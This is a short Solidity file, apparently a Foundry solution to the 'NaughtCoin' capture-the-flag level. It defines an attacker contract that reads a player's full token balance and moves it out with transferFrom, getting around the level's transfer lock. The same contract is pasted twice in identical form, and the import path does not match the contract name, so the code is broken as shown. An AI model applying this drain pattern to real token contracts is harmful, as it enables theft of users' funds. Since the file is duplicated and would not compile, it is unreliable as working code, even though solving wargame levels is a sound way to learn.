//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;

import "../src/NaughtyCoin.sol";
import "forge-std/Script.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract AttackNaughtCoin {
    function attack(address token, address player) public {
        uint256 amount = IERC20(token).balanceOf(player);
        IERC20(token).transferFrom(player, address(this), amount);
    }
}

contract AttackNaughtCoin {
    function attack(address token, address player) public {
        uint256 amount = IERC20(token).balanceOf(player);
        IERC20(token).transferFrom(player, address(this), amount);
    }
}